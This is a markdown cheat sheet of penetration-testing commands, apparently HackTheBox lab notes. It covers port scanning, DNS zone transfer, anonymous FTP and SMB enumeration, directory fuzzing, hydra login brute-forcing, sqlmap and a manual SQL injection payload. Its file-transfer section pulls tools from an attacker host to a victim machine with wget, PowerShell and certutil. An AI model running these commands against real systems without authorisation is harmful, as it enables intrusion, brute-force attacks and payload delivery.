# Commands

- [Port Scanning](#ps)
- [21 - FTP Port](#ftp)
- [53 - DNS Port](#dns)
- [139/445 - Samba/SMB](#smb)
- [Directory Enumeration](#dir)
- [Login BruteForce](#log)
- [Sql Injection](#si)
- [Active Directory](https://github.com/cyberwr3nch/hackthebox/blob/master/notes/Active%20Directory.md)
- [File Transfer](#ft)

### Port Scanning <a name='ps'></a>

#### Tools Required

- [Nmap](https://nmap.org/download.html)
- [Rustscan](https://github.com/RustScan/RustScan/wiki/Installation-Guide#%EF%B8%8F-debian--kali)

```bash
# port scanning with nmap
# full tcp port scan
nmap -p- --min-rate=1000 -vv -Pn <machine-ip>
# full udp port scan
nmap -p- -sU -vv -Pn <machine-ip>
nmap -p<enumerated-ports> -sC -sV -oN services.nmap <machine-ip>

# rustscan
# installation frorm above
rustscan -a <machine-ip>
nmap -p<enumerated-ports> -sC -sV -oN services.nmap <machine-ip>
```

### DNS Port <a name='dns'></a>

#### Tools Require

- [Dig](https://linuxhint.com/install_dig_debian_9/)

```bash
# reverse lookup
dig -x <machine-ip> @<machine-ip>

# zone transfer --> output: Subdomains
dns axfr domain.tld @<machine-ip>
```

### FTP Port <a name='ftp'></a>

#### Tools Required

- FTP

```bash
# anonymous login
ftp <machine-ip>
# username anonymous
# password anonymous

# downlaod files recursively without prompt
binary
prompt off
mget *
```

### Samba/SMB Port <a name='smb'></a>

#### Tools Required

- [Crackmapexec](https://github.com/byt3bl33d3r/CrackMapExec/wiki/Installation)
- SmbClient

```bash
# check the access of the shares
# set user and password anonymous for anonymous checking
# set user and password for a valid user to enumerate shares as network user
crackmapexec smb <machine-ip> -u user -p password --shares

# access the share which you have permission to
smbclient //<machine-ip>/<share-name> -U user
# password
```

### Directory Enumeration <a name='dir'></a>

#### Tools Required

- [Gobuster](https://github.com/OJ/gobuster/releases/tag/v3.1.0)
- [DirSearch](https://github.com/maurosoria/dirsearch#Installation--Usage)
- [rustbuster](https://github.com/phra/rustbuster/releases)
- [ffuf](https://github.com/ffuf/ffuf)

```bash
# directory enumeration
# wordlist = raft-medium-directories.txt
## gobuster
gobuster dir -u http://<machine-ip> -w wordlist -x php,html -b 404 -t 50 -o gobuster.out
# rustbuster  
rustbuster dir -u http://<machine-ip> -w wordlist -e php -S 404,403 -o rustbuster.out
# dirsearch
python3 dirsearch.py -u http://<machine-ip> -w wordlist
# ffuf
ffuf -u http://<machine-ip>/FUZZ -w wordlist -fr 'not'

# subdomain enumeration
# wordlist = subdomains-top-11000.txt
## gobuster
gobuster vhost -w wordlist -u http://<machine-ip> -o gobuster-vhost.out
## ffuf 
ffuf -w wordlist -u http://<machine-ip>/ -H "Host: FUZZ.domain.tld" -mc 200
```

### Login Bruteforce <a name="log"></a>

#### Tools Required

- [ffuf](https://github.com/ffuf/ffuf)
- [Hydra](https://github.com/vanhauser-thc/thc-hydra#how-to-compile)

```bash
# wordlist = rockyou.txt
# ffuf
ffuf -u http://<machine-ip>/login-page.php -X POST -d '{"user":"FUZZ", "pass":"FUZZ"}' -w wordlist

# hydra
# loginpage: /squirrelmail/src/login.php
# payload sent during login: login_username=^USER^&secretkey=^PASS^&js_autodetect_results=1&just_logged_in=1 (provided username and password is replaced with ^USER^ & ^PASS^)
# error message: Unknown
hydra -l 'admin' -P wordlist <machine-ip> http-post-form '/{login-page}:{payload sent during login}:{error message}' -v
```

### SQLInjection <a name="si"></a>

#### Tools Required

- [SqlMap](https://sqlmap.org/)

```bash
# capture the login request with burp and save it as login.req
sqlmap -r login.req --level=5 --risk=3 --batch

# manual expoitation
> Capture the request with burp
> The entered paramaters will be url encoded, decode it with <ctrl>+<shift>+<u>
> Enter the payload " ' or 1 = 1 -- - " (simple sql injection payload)
> After changing the payload, url encode it with <ctrl>+<u>
```

### File Transfer <a name="ft"></a>

#### Tools Required

- [Python3](https://www.python.org/downloads/)
- [Impackets](https://github.com/SecureAuthCorp/impacket#installing)

```bash 
# between *nix os

# on the attacker machine
python3 -m http.server 8081

# on the victim machine
wget http://<attacker-ip>:<port>/<file>
curl http://<attacker-ip>:<port>/<file> -o <output-file>

#===========================================================#

# from linux to windows

# on the attacker machine
# creates a anonymous login
sudo smbserver.py <share-name> <linux-path> -smb2support

# on the victim machine
copy \\<attacker-ip>\<share-name>\<file> <copy-path-in-windows>
# mount the share in windows
net use x: \\<attacker-ip>\<share-name> /user:<user-name> <password>
copy x:\<file> <copy-path-in-windows>

# from external url
# sometimes fails
powershell -c (new-object System.Net.WebClient).DownloadFile('http://<attacker-ip>/<file>','<download-path-in-windows>')

# works mostly
#@alias
iwr -uri 'http://<attacker-ip>/<file>' -o '<download-path-in-windows>'
#@cmdlet
powershell.exe -command Invoke-WebRequest -Uri 'http://<attacker-ip>/<file>' -OutFile '<download-path-in-windows>'

# using certutil
certutil -urlcache -f 'http://<attacker-ip>/<file>' '<download-path-in-windows>'
```